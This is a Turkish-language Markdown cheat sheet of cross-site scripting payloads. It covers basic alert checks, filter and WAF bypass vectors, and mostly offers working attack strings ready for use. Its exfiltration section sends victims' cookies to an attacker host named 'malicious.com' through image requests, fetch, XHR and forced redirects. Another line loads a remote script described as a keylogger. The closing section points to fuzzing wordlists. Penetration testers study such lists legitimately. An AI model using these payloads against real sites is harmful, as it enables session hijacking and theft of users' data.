# XSS (Cross-Site Scripting) Payload Cheatsheet


Hedef sistemlerde her zaman basit `<script>` etiketleri çalışmaz. Modern web uygulamaları, WAF (Web Application Firewall) veya geliştirici filtreleri kullanarak temel saldırıları engeller. Bu durumlarda farklı HTML etiketlerini, olay dinleyicilerini (event handlers) veya kodlama yöntemlerini kullanarak filtreleri atlatmak (Bypass) gerekir.

## 1. Temel Doğrulama (Proof of Concept - PoC) Payload'ları
Bunlar bir sistemde XSS olup olmadığını hızlıca anlamak için kullanılan zararsız uyarı mesajlarıdır.

| Payload | Açıklama ve Kullanım Amacı |
| :--- | :--- |
| `<script>alert('XSS')</script>` | En temel XSS kontrolüdür. Uyarı kutusu çıkarır. |
| `<script>alert(document.cookie)</script>` | Çerezlerin sayfada erişilebilir olup olmadığını (HttpOnly bayrağının eksikliğini) kontrol eder. |
| `<script>alert(document.domain)</script>` | Sayfanın hangi domain bağlamında (context) çalıştığını gösterir. |

---

## 2. Filtre Atlatma (Bypass) ve Alternatif Vektörler
Eğer sistem `<script>` etiketini filtreleyip siliyorsa, HTML'in diğer özelliklerinden faydalanılır.

| Payload | Açıklama ve Kullanım Amacı |
| :--- | :--- |
| `<img src="x" onerror="alert('XSS')">` | Olmayan bir resmi (`x`) yüklemeye çalışır, hata alınca `onerror` içindeki JS kodunu çalıştırır. |
| `<svg/onload=alert('XSS')>` | Vektörel bir çizim dosyası yüklenir yüklenmez (`onload`) içindeki JS kodunu tetikler. WAF atlatmada çok etkilidir. |
| `<body onload=alert('XSS')>` | Tüm sayfa yüklendiğinde kodu çalıştırır. HTML Injection ile birleştirilip kullanılabilir. |
| `"><script>alert('XSS')</script>` | HTML içindeki bir girdi alanında (`input`), önce mevcut etiketi kapatıp (`">`) sonra dışarıya kendi scriptini yazar. |
| `<a href="javascript:alert('XSS')">Tıkla!</a>` | Kurban linke tıkladığı anda doğrudan URL yerine JavaScript kodu çalışır. |
| `onmouseover="alert('XSS')"` | Fare imleci resmin/yazının üzerine geldiğinde kodu çalıştıran bir olay dinleyicisidir. |

---

## 3. Veri Hırsızlığı ve Yönlendirme Payload'ları (Exfiltration)
Sadece ekrana uyarı çıkarmak yerine, kurbanın verilerini arka planda gizlice saldırganın sunucusuna çalan ileri düzey scriptlerdir.

| Payload | Açıklama ve Kullanım Amacı |
| :--- | :--- |
| `<script>new Image().src='http://malicious.com/?cookie=' + document.cookie;</script>` | Kurbanın tarayıcısında görünmez bir resim oluşturur, resmi çekerken kurbanın çerezlerini saldırgana ait adrese log olarak yollar. |
| `<script>fetch("http://malicious.com/?cookie="+document.cookie)</script>` | `fetch` API'si kullanarak arka planda (AJAX) asenkron olarak çerezleri saldırgana iletir. |
| `<script>document.location='http://malicious.com/?cookie=' + document.cookie;</script>` | Kurbanı, kendi çerezleriyle birlikte zorla saldırganın sitesine yönlendirir. |
| `<script>xhr=new XMLHttpRequest();xhr.open('GET','https://malicious.com?cookie='+document.cookie,true);xhr.send();</script>` | Klasik AJAX (XHR) yöntemiyle kurbanın çerezlerini dış sunucuya çeker. |

---

## 4. Özel Durumlar (DOM Manipülasyonu ve İzolasyon Atlatma)

| Payload | Açıklama ve Kullanım Amacı |
| :--- | :--- |
| `<iframe src="javascript:alert('XSS')">` | Kurbanın sayfasında görünmez bir pencere (iframe) açar ve içinde kod çalıştırır. |
| `<script src="http://example.com/malicious.js"></script>` | Saldırganın kendi sunucusundaki uzun ve karmaşık JavaScript dosyasını (örneğin bir Keylogger) kurbanın sayfasına dahil eder. |
| `<script>localStorage.setItem('data', document.cookie);</script>` | Çalınan veriyi kurbanın tarayıcısındaki yerel depolamaya (Local Storage) yazar. |

---

## 5. İleri Düzey Hazır Wordlist Kaynakları
Gerçek bir sızma testinde (Pentest) bu payload'lar, otomatize fuzzing araçlarına (örneğin Burp Suite Intruder) verilerek hedefe binlerce varyasyon olarak denenir. 

Sektörde en çok kabul gören XSS kelime listeleri (Wordlists):
1. **PayloadsAllTheThings:** [XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
2. **SecLists:** [Fuzzing XSS](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS)
3. **PayloadBox:** [XSS Payload List](https://github.com/payloadbox/xss-payload-list)
4. **s0md3v:** [AwesomeXSS](https://github.com/s0md3v/AwesomeXSS)